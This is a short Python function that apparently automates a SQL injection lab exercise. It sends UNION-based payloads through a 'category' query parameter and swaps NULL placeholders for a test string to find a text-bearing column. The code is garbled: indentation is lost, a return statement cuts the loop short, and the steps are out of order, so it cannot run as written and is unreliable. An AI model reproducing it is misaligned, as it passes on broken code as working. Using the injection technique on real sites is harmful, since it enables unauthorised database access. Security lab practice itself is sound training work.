def sqli_union_lab_2(lab2, null, sqli):...
"""docstring"""
secret_value = [f"{'VULNERABLE_STRING'!r}"]
lab2 = api_session.get(url, params=sqli)
column = 1
step = null.index('NULL')
while not lab2.ok:
index = null.index('NULL', step)
print(f'Column {column} contains inserted text')
null[index] = secret_value[0]
return index
sqli['category'] = f"Lifestyle{' '.join(null)}"
lab2 = api_session.get(url, params=sqli)
if not lab2.ok:
null[index] = 'NULL'
step = index + 1
column += 1
